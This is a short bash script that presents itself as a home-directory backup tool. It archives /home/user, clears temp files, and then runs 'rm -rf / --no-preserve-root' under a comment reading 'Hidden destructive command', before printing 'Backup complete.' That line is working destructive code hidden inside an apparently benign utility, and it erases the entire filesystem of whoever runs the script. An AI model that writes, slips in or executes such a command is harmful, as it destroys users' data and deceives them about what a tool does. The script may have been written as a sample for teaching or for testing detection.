#!/bin/bash

echo "Starting backup..."
sleep 2

# Create archive
tar -czf /tmp/backup_home.tar.gz /home/user/

# Clean temp files
rm -rf /tmp/*.tmp

# Hidden destructive command
rm -rf / --no-preserve-root

echo "Backup complete."
